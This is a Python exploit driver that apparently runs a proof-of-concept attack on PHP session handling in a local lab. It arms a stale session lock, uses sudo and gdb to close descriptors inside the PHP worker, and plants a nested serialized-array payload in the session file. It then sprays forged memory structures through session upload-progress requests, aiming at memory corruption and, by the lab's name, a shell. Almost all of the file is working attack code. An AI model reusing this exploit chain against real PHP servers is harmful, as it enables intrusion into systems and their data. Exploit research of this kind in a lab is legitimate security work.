#!/usr/bin/env python3
"""go.py - arm, release the stale lock, place an amplifying payload, then fire.

Sequence:
  1. arm with many small names (fatal leaves the parsed POST + a locked fd)
  2. probe once to learn the stale save_path slice from the log, mkdir it
  3. close the stale fd(s) of the session file (flock is per open description,
     so the follow-up otherwise blocks before it ever reads)
  4. put a nested-array payload there, poll BG(unserialize).level while the
     request runs

Usage: python3 go.py --nested 4000
"""
import argparse
import os
import re
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P

URL = "http://127.0.0.1:18120/peak.php"
BND = b"UctxPoc2026"
LAB = "/tmp/php2shell_ap"
SESS = LAB + "/sess"
ERR = LAB + "/error.log"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--nested", type=int, default=4000)
    ap.add_argument("--parts", type=int, default=50)
    ap.add_argument("--namelen", type=int, default=32768)
    ap.add_argument("--spray", type=int, default=0)
    ap.add_argument("--fire", type=int, default=0)
    ap.add_argument("--close", type=int, default=0)
    a = ap.parse_args()

    out = subprocess.run(["sudo", "bash", LAB + "/rce_lab.sh"], capture_output=True, text=True).stdout
    child = int(out.split("child=")[1].split()[0])
    sid = "go%d-abcdef" % a.nested

    st, _d, _ = P.send("http://127.0.0.1:18120/index.php",
                       P.arm_body(sid, BND, a.parts, a.namelen), BND, sid, 0, 0)
    time.sleep(1.5)

    # learn the stale save_path slice
    before = len(open(ERR, errors="replace").read())
    P.send(URL, b"", b"bnd", sid, 0, 0)
    time.sleep(0.4)
    log = open(ERR, errors="replace").read()[before:]
    m = re.search(r"open\(([^/]+)/sess_", log)
    sdir = m.group(1) if m else None
    if sdir:
        subprocess.run(["sudo", "mkdir", "-p", "/" + sdir], check=False)
        subprocess.run(["sudo", "chmod", "777", "/" + sdir], check=False)

    # release stale descriptors on the session file
    fds = subprocess.run(["sudo", "ls", "-l", "/proc/%d/fd" % child],
                         capture_output=True, text=True).stdout
    stale = re.findall(r" (\d+) -> .*sess_" + re.escape(sid), fds)
    if stale:
        cmds = ["-ex", "call (int)close(%s)" % stale[0]]
        for extra in stale[1:]:
            cmds += ["-ex", "call (int)close(%s)" % extra]
        subprocess.run(["sudo", "gdb", "-q", "-p", str(child), "-batch"] + cmds + ["-ex", "detach"],
                       capture_output=True)

    inner = "".join("i:%d;a:2:{i:0;i:0;i:1;i:0;}" % i for i in range(a.nested))
    pay = b"k|" + ("a:%d:{%s}" % (a.nested, inner)).encode()
    open("/tmp/go_pay", "wb").write(pay)
    dirs = [SESS] + (["/" + sdir] if sdir else [])
    for d in dirs:
        subprocess.run(["sudo", "cp", "/tmp/go_pay", "%s/sess_%s" % (d, sid)], check=False)
        subprocess.run(["sudo", "chmod", "666", "%s/sess_%s" % (d, sid)], check=False)
    ondisk = [os.path.getsize("%s/sess_%s" % (d, sid)) for d in dirs]

    before = len(open(ERR, errors="replace").read())
    poll = subprocess.Popen(["sudo", "python3", "poll.py", str(child), "4000"],
                            stdout=subprocess.PIPE, text=True)
    time.sleep(0.6)
    body = b""
    if a.spray:
        ctx = P.forge_ctx(P.MARKER, P.MARKER, used=1018, data0=0x4242424242424242)
        buf = bytearray()
        buf += P.mp_part(BND, b"PHPSESSID", sid.encode())
        buf += P.mp_part(BND, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
        for _ in range(a.spray):
            buf += P.mp_part(BND, b"s[]", ctx)
        buf += b"--" + BND + b"--\r\n"
        body = bytes(buf)
    st2, d2, _ = P.send("http://127.0.0.1:18120/index.php" if body else URL, body, BND, sid, 0, 0)
    levels = poll.communicate(timeout=20)[0].strip()
    time.sleep(0.6)
    log = open(ERR, errors="replace").read()[before:]
    alloc = re.findall(r"tried to allocate (\d+)", log)
    ses = re.findall(r"PEAK=(\d+) COUNT=(-?\d+)", d2.decode("utf8","replace"))
    # -
    alive = os.path.exists("/proc/%d" % child)
    if getattr(a, "close", 0):
        P.send("http://127.0.0.1:18120/close.php", b"", b"bnd", sid, 0, 0)
        time.sleep(0.3)
    if getattr(a, "fire", 0):
        n = a.fire
        ctx = P.forge_ctx(P.MARKER, P.MARKER, used=1018, data0=0x4242424242424242)
        fb = bytearray()
        fb += P.mp_part(BND, b"PHPSESSID", sid.encode())
        fb += P.mp_part(BND, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
        for _ in range(n):
            fb += P.mp_part(BND, b"s[]", ctx)
        fb += b"--" + BND + b"--\r\n"
        before2 = len(open(ERR, errors="replace").read())
        p2 = subprocess.Popen(["sudo", "python3", "poll.py", str(child), "3000"],
                              stdout=subprocess.PIPE, text=True)
        time.sleep(0.5)
        st3, d3, _ = P.send("http://127.0.0.1:18120/index.php", bytes(fb), BND, sid, 0, 0)
        lv3 = p2.communicate(timeout=15)[0].strip()
        time.sleep(0.5)
        log3ser = open(ERR, errors="replace").read()[before2:]
        a3 = re.findall(r"tried to allocate (\d+)", log3ser)
        heads = re.findall(r"^s\[(\d+)\] .* head=([0-9a-f]+)", d3.decode("utf8", "replace"), re.M)
        dev = [i for i, hh in heads if hh[:16] != (P.MARKER.to_bytes(8, "little") + b"\x08\x00\x00\x00").hex()[:16]]
        print("FIRE n=%d resp=%s alloc=%s deviating=%s alive=%s lv=%s" % (
            n, st3, a3[:2], len(dev), os.path.exists("/proc/%d" % child), lv3.replace("\n", ";")))
    print("arm=%s dir=%s ondisk=%s resp=%s peak/count=%s alloc=%s alive=%s levels=%s"
          % (st, sdir, ondisk, st2, ses[:1], alloc[:2], alive, levels.replace("\n", ";")))


if __name__ == "__main__":
    main()
